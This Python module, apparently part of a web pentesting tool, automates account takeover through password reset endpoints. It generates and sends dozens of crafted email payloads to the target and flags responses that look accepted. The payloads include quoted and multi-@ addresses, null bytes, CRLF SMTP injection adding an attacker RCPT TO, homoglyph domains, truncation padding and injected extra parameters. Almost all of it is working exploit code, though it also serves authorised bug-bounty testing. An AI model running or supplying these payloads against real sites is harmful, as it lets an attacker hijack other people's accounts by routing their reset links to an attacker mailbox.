#!/usr/bin/env python3
"""
Email Hijack — Exploits parsing differentials between email validation,
DB user lookup, and SMTP delivery in password reset flows.

The goal: find an email format that passes validation (step 1),
matches the victim in the DB (step 2), but gets delivered to the
attacker's mailbox (step 3).

References:
- RFC 5321 (SMTP), RFC 5322 (email format), RFC 6531 (internationalized email)
- CVE-2020-7245 (CTFd username collision via whitespace)
- CVE-2023-7028 (GitLab email array password reset)
- https://book.hacktricks.xyz/pentesting-web/reset-password
- https://github.com/tuhin1729/Bug-Bounty-Methodology/blob/main/PasswordReset.md
"""
import sys
sys.dont_write_bytecode = True

from utils.style import Colors
from utils.utils import (
    requests,
    re,
    json,
    get_domain_from_url,
    EMAIL_REGEX,
    human_time
)
import urllib.parse


SUCCESS_INDICATORS = [
    "success", "email sent", "password reset", "reset link",
    "check your email", "lien envoy", "réinitialis", "mot de passe",
    "mail envoy", "correo enviado", "email gesendet", "sent you",
    "instructions", "recovery", "we have sent", "check your inbox",
]


def _detect_content_type(headers):
    for k, v in headers.items():
        if k.lower() == "content-type":
            v_lower = v.lower()
            if "application/json" in v_lower:
                return "json"
            if "application/x-www-form-urlencoded" in v_lower:
                return "form"
            if "multipart/form-data" in v_lower:
                return "multipart"
    return "unknown"


def _get_email_param_and_victim(body, content_type):
    """Extract email param name and victim email from body."""
    if not body:
        return None, None

    if content_type == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, str) and re.search(EMAIL_REGEX, v, re.IGNORECASE):
                        return k, v
                    if isinstance(v, dict):
                        for k2, v2 in v.items():
                            if isinstance(v2, str) and re.search(EMAIL_REGEX, v2, re.IGNORECASE):
                                return k2, v2
        except:
            pass

    elif content_type == "form":
        try:
            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
            for k, vals in parsed.items():
                for v in vals:
                    if re.search(EMAIL_REGEX, v, re.IGNORECASE):
                        return k, v
        except:
            pass

    # Fallback regex
    match = re.search(rf'([^\s&=,"\']+)\s*[=:]\s*"?({EMAIL_REGEX})"?', body, re.IGNORECASE)
    if match:
        return match.group(1).strip('"'), match.group(2)

    return None, None


def _replace_email_in_body(body, content_type, param_name, new_email):
    """Replace the email value in body, preserving format."""
    if content_type == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                if param_name in data:
                    data[param_name] = new_email
                    return json.dumps(data)
                for k, v in data.items():
                    if isinstance(v, dict) and param_name in v:
                        data[k][param_name] = new_email
                        return json.dumps(data)
        except:
            pass

    elif content_type == "form":
        try:
            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
            if param_name in parsed:
                parsed[param_name] = [new_email]
                return urllib.parse.urlencode(parsed, doseq=True)
        except:
            pass

    return re.sub(EMAIL_REGEX, new_email, body, count=1, flags=re.IGNORECASE)


def _add_param_to_body(body, content_type, param_name, value):
    """Add an extra parameter to the body."""
    if content_type == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                data[param_name] = value
                return json.dumps(data)
        except:
            pass

    elif content_type == "form":
        separator = "&" if body else ""
        return f"{body}{separator}{urllib.parse.quote(param_name)}={urllib.parse.quote(value)}"

    return body


def _is_accepted(resp, baseline):
    """Check if the backend accepted the reset (same status + similar body length)."""
    if resp.status_code != baseline["status"]:
        return False, None

    bl = baseline["body_length"]
    rl = len(resp.text)
    if bl > 0 and abs(rl - bl) / bl > 0.15:
        return False, None

    resp_lower = resp.text.lower()
    for indicator in SUCCESS_INDICATORS:
        if indicator in resp_lower:
            return True, indicator

    return True, None


def _build_payloads(victim_email, attacker_email, attacker_domain, interact_domain):
    """Build all email hijack payloads as flat lists."""
    victim_local, victim_domain = victim_email.split("@", 1)
    attacker_local = attacker_email.split("@")[0] if "@" in attacker_email else "attacker"

    payloads = [
        # Quoted local part / RFC comments
        f'"{victim_email}"@{attacker_domain}',
        f'"{victim_local}"@{victim_domain}@{attacker_domain}',
        f"{victim_local}@{victim_domain}({attacker_domain})",
        f"({attacker_domain}){victim_local}@{victim_domain}",
        f'{victim_local}@{victim_domain}\\"{attacker_domain}',

        # Multiple @
        f"{victim_local}@{attacker_domain}@{victim_domain}",
        f"{victim_local}@{victim_domain}@{attacker_domain}",

        # Percent hack
        f"{victim_local}%{victim_domain}@{attacker_domain}",
        f"{victim_local}%{attacker_domain}@{victim_domain}",

        # Null byte / terminators
        f"{victim_email}%00@{attacker_domain}",
        f"{victim_email}%00",
        f"{victim_email}\x00",
        f"{victim_email}%0d%0a@{attacker_domain}",
        f"{victim_email}%0a",

        # Whitespace
        f" {victim_email}",
        f"{victim_email} ",
        f"{victim_local} @{victim_domain}",
        f"{victim_local}@{victim_domain} {attacker_email}",
        f"\t{victim_email}",
        f"{victim_email}\t",

        # Double encoding / fullwidth @
        f"{victim_local}%2540{victim_domain}",
        f"{victim_local}%40{victim_domain}",
        victim_email.replace("@", "\uFE6B"),
        victim_email.replace("@", "\uFF20"),

        # Case
        victim_email.upper(),
        f"{victim_local.upper()}@{victim_domain}",
        f"{victim_local}@{victim_domain.upper()}",

        # Sub-addressing
        f"{victim_local}+{attacker_local}@{victim_domain}",
        f"{victim_local}-{attacker_local}@{victim_domain}",
        f"{victim_local}+@{victim_domain}",

        # Space multi-recipient
        f"{victim_email} {attacker_email}",
        f"{attacker_email} {victim_email}",

        # SMTP command injection
        f"{victim_email}%0d%0aRCPT TO:<{attacker_email}>",
        f"{victim_email}%0d%0aDATA%0d%0a",
        f"{victim_email}\r\nRCPT TO:<{attacker_email}>",
    ]

    # DB truncation
    padding_255 = max(0, 252 - len(victim_email))
    if padding_255 > 0:
        payloads.append(f"{victim_local}{'a' * padding_255}@{attacker_domain}")
    padding_64 = max(0, 61 - len(victim_local))
    if padding_64 > 0:
        payloads.append(f"{victim_local}{'a' * padding_64}@{attacker_domain}")

    # IDN homoglyph domain
    for char_l, char_c in [("a", "\u0430"), ("e", "\u0435"), ("o", "\u043E")]:
        if char_l in victim_domain:
            payloads.append(f"{victim_local}@{victim_domain.replace(char_l, char_c, 1)}")

    # Unicode dots in domain
    if "." in victim_domain:
        parts = victim_domain.split(".")
        payloads.append(f"{victim_local}@{chr(0x3002).join(parts)}")
        payloads.append(f"{victim_local}@{chr(0xFF0E).join(parts)}")

    # Gmail specific
    if "gmail" in victim_domain.lower():
        payloads.append(".".join(victim_local) + f"@{victim_domain}")
        payloads.append(f"{victim_local}@googlemail.com")
    elif "googlemail" in victim_domain.lower():
        payloads.append(f"{victim_local}@gmail.com")

    # Alt param names (param, value)
    alt_param_payloads = [
        ("Email", attacker_email),
        ("mail", attacker_email),
        ("username", attacker_email),
        ("login", attacker_email),
        ("emailAddress", attacker_email),
        ("e-mail", attacker_email),
        ("user_email", attacker_email),
        ("to", attacker_email),
        ("recipient", attacker_email),
    ]

    return payloads, alt_param_payloads


# ─── Main ─────────────────────────────────────────────────────────────────────

def email_hijack(url, human, parsed_req, baseline, interact, email, proxy=None):
    """
    Email hijack testing — exploits parsing differentials between
    validation, DB lookup, and SMTP delivery.
    """
    print(f"{Colors.CYAN} ├ Email hijack{Colors.RESET}")

    original_host = parsed_req["host"]
    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])
    scheme = "https" if "https" in url else "http"

    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None

    if not body:
        print(f"  {Colors.YELLOW}[!] No body{Colors.RESET}")
        return

    content_type = _detect_content_type(headers)
    param_name, victim_email = _get_email_param_and_victim(body, content_type)

    if not param_name or not victim_email:
        print(f"  {Colors.YELLOW}[!] Could not extract email param{Colors.RESET}")
        return

    if not email or "@" not in email:
        print(f"  {Colors.YELLOW}[!] Controlled email (-e) required{Colors.RESET}")
        return

    attacker_email = email
    attacker_domain = attacker_email.split("@")[1]
    interact_domain = get_domain_from_url(interact) if interact else attacker_domain

    email_payloads, alt_param_payloads = _build_payloads(
        victim_email, attacker_email, attacker_domain, interact_domain
    )

    # ─── Phase 1: Email replacement payloads ─────────────────────────────
    for crafted_email in email_payloads:
        try:
            human_time(human)
            modified_body = _replace_email_in_body(body, content_type, param_name, crafted_email)
            if modified_body == body:
                continue

            resp = requests.request(
                method=method, url=uri, headers=headers,
                data=modified_body, verify=False, allow_redirects=False,
                timeout=10, proxies=proxies,
            )

            accepted, indicator = _is_accepted(resp, baseline)
            if accepted:
                reason = f"success: '{indicator}'" if indicator else f"status={resp.status_code} len={len(resp.text)}b ≈ baseline"
                print(f"{Colors.GREEN}   └── [+] {reason}{Colors.RESET}")
                print(f"{Colors.GREEN}       email: {crafted_email}{Colors.RESET}")
                print(f"{Colors.GREEN}       body: {modified_body}{Colors.RESET}")

        except requests.RequestException:
            pass

    # ─── Phase 2: Extra parameter injection ──────────────────────────────
    for alt_param, alt_value in alt_param_payloads:
        if alt_param.lower() == param_name.lower():
            continue

        try:
            human_time(human)
            modified_body = _add_param_to_body(body, content_type, alt_param, alt_value)
            if modified_body == body:
                continue

            resp = requests.request(
                method=method, url=uri, headers=headers,
                data=modified_body, verify=False, allow_redirects=False,
                timeout=10, proxies=proxies,
            )

            accepted, indicator = _is_accepted(resp, baseline)
            if accepted:
                reason = f"success: '{indicator}'" if indicator else f"status={resp.status_code} len={len(resp.text)}b ≈ baseline"
                print(f"{Colors.GREEN}   └── [+] {reason}{Colors.RESET}")
                print(f"{Colors.GREEN}       added: {alt_param}={alt_value}{Colors.RESET}")
                print(f"{Colors.GREEN}       body: {modified_body}{Colors.RESET}")

        except requests.RequestException:
            pass